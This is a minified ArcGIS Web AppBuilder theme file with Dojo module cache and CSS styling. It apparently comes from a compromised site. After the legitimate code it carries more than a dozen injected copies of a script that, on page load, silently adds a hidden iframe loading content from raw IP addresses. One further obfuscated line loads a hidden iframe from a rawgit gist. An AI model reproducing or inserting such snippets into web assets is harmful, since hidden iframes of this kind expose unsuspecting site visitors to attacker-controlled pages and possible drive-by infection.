// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"themes/BoxTheme/_build-generate_module":function(){define(["dojo/text!./common.css","dojo/text!./styles/default/style.css","dojo/i18n!./nls/strings"],function(){})},"url:themes/BoxTheme/common.css":'@font-face {font-family: "HelveticaNeue"; src: url("fonts/helvetica_neue/helveticaneue.eot?#iefix"); src: url("fonts/helvetica_neue/helveticaneue.eot?#iefix") format("eot"), url("fonts/helvetica_neue/helveticaneue.woff2") format("woff2"), url("fonts/helvetica_neue/helveticaneue.woff") format("woff"), url("fonts/helvetica_neue/helveticaneue.ttf") format("truetype"), url("fonts/helvetica_neue/helveticaneue.svg#bHelveticaNeue") format("svg"); font-weight: normal; font-style: normal;}@font-face {font-family: \'HelveticaNeueUltraLight\'; src: url("fonts/helvetica_neue/helveticaneueultralight.eot?#iefix"); src: url("fonts/helvetica_neue/helveticaneueultralight.eot?#iefix") format(\'eot\'), url("fonts/helvetica_neue/helveticaneueultralight.woff2") format(\'woff2\'), url("fonts/helvetica_neue/helveticaneueultralight.woff") format(\'woff\'), url("fonts/helvetica_neue/helveticaneueultralight.ttf") format(\'truetype\'), url("fonts/helvetica_neue/helveticaneueultralight.svg#HelveticaNeueUltraLight") format(\'svg\'); font-weight: normal; font-style: normal;}@font-face {font-family: \'liberation_sansbold\'; src: url("fonts/liberation_sans/liberationsans-bold-webfont.eot"); src: url("fonts/liberation_sans/liberationsans-bold-webfont.eot?#iefix") format(\'embedded-opentype\'), url("fonts/liberation_sans/liberationsans-bold-webfont.woff2") format(\'woff2\'), url("fonts/liberation_sans/liberationsans-bold-webfont.woff") format(\'woff\'), url("fonts/liberation_sans/liberationsans-bold-webfont.ttf") format(\'truetype\'), url("fonts/liberation_sans/liberationsans-bold-webfont.svg#liberation_sansbold") format(\'svg\'); font-weight: normal; font-style: normal;}@font-face {font-family: \'liberation_sansregular\'; src: url("fonts/liberation_sans/liberationsans-regular-webfont.eot"); src: url("fonts/liberation_sans/liberationsans-regular-webfont.eot?#iefix") format(\'embedded-opentype\'), url("fonts/liberation_sans/liberationsans-regular-webfont.woff2") format(\'woff2\'), url("fonts/liberation_sans/liberationsans-regular-webfont.woff") format(\'woff\'), url("fonts/liberation_sans/liberationsans-regular-webfont.ttf") format(\'truetype\'), url("fonts/liberation_sans/liberationsans-regular-webfont.svg#liberation_sansregular") format(\'svg\'); font-weight: normal; font-style: normal;}.box-frame {position: relative; margin: 10px; height: auto; min-height: 100%; -webkit-transition: all 1s; -moz-transition: all 1s; -o-transition: all 1s; transition: all 1s; background-color: #ffffff; overflow: visible; clear: both;}.box-frame.collapsed {height: 30px !important; min-height: 30px; overflow: hidden;}.box-frame .title {position: relative; background-color: #efefef; padding-left: 30px; background-image: url("panels/BoxPanel/images/minus.png"); background-position: left center; background-repeat: no-repeat; cursor: pointer;}.box-frame.collapsed .title {background-image: url("panels/BoxPanel/images/plus.png");}.box-frame .title-label {font-size: 14px; line-height: 30px;}.box-frame\x3e.panel-content {position: absolute; left: 0; right: 0; height: 100%; background-color: #ffffff; overflow: hidden;}.box-panel \x3e .box-frame{margin-bottom: 30px;}.box-panel \x3e .box-frame.collapsed{margin-bottom: 0;}.panel-content {background-color: #ffffff;}body,html {font-family: \'HelveticaNeue\'; font-weight: normal;}strong {font-family: \'HelveticaNeue\';}.esriControlsBR {bottom: 10px; left: 10px; right: auto; width: auto; height: auto; text-align: left;}.jimu-rtl .esriControlsBR {bottom: 10px; right: 10px; left: auto; width: auto; height: auto; text-align: right;}.jimu-rtl .esriAttribution {position: absolute; margin: 0 5px 0; text-align: right; left: auto; right: 0px; bottom: 0;}.logo-med {position: absolute; left: 0px; bottom: 15px;}.jimu-rtl .map .logo-med {position: absolute; right: 0px; left: auto; bottom: 15px; float: none;}.jimu-widget-zoomslider {width: 25px !important; height: 51px !important; font-size: 15px; line-height: 25px; border-radius: 0px !important;}.jimu-widget-zoomslider .zoom {width: 25px; height: 25px; border-radius: 0px !important;}.jimu-widget-zoomslider .zoom-in {height: 26px;}.jimu-widget-zoomslider.vertical .zoom-in {border-bottom: 1px solid rgba(0, 0, 0, 0.2);}.jimu-widget-extent-navigate{border-radius: 0 !important;}.jimu-widget-extent-navigate .operation{width: 25px; height: 25px; font-size: 10px; line-height: 25px; border-radius: 0 !important;}.jimu-widget-homebutton,.jimu-widget-mylocation,.jimu-widget-mylocation .place-holder,.HomeButton .home {width: 25px !important; height: 25px !important; border-radius: 0px !important;}.HomeButton .home,.place-holder {background-color: transparent !important;}.jimu-widget-bookmark .add-section{margin-top: 0 !important;}.jimu-widget-bookmark .jimu-state-error{margin-top: 0 !important;}.jimu-widget-bookmark .play-section{margin-top: 10px !important;}.bookmark-list.jimu-tile-container {min-height: 80px !important;}.jimu-widget-bookmark .jimu-btn {width: 100px !important;}.jimu-symbol-chooser {width: 100% !important;}@media only screen and (max-width: 500px) {.jimu-widget-zoomslider {display: none;} .jimu-widget-homebutton {top: 10px !important;} .jimu-widget-mylocation {top: 40px !important;} .jimu-widget-extent-navigate{top: 74px !important;}}',
"url:themes/BoxTheme/styles/default/style.css":".box-bgcolor {background-color: #646464;}.box-simple-panel {background-color: #ffffff;}.esriSimpleSlider {text-align: center; color: #ffffff; background-color: #646464; cursor: pointer; border-radius: 0px;}.jimu-widget-zoomslider,.jimu-widget-homebutton,.jimu-widget-mylocation,.jimu-widget-extent-navigate,.jimu-widget-fullScreen .fullScreen {background-color: #646464;}.esriPopup .titlePane {background-color: #646464;}","*now":function(a){a(['dojo/i18n!*preload*themes/BoxTheme/nls/main*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},
"*noref":1}});define([],function(){});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});